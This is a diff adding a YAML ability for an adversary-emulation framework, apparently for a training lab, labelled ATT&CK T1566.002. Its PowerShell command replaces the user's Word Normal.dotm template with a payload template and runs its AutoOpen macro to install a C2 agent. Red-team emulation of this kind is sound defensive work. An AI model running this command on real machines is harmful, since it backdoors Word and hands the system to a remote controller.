@@ -1,0 +1,14 @@
+- description: Install fake word document template and install a C2 agent
+  id: af1a51d8-5068-4e46-9035-af27296a8181
+  name: Spearfishing Attachment
+  platforms:
+    windows:
+      psh,pwsh:
+        cleanup:
+        command: 'Copy-Item -Path Normal.dotm -Destination "C:\Users\student\AppData\Roaming\Microsoft\Templates\Normal.dotm"; $Word = New-Object -ComObject Word.Application; $word.Visible = $true; $app = $word.Application; $app.Run("AutoOpen"); $word.Quit();'
+        payloads:
+          - Normal.dotm
+  tactic: initial-access
+  technique:
+    attack_id: T1566.002
+    name: Spearfishing Attachment
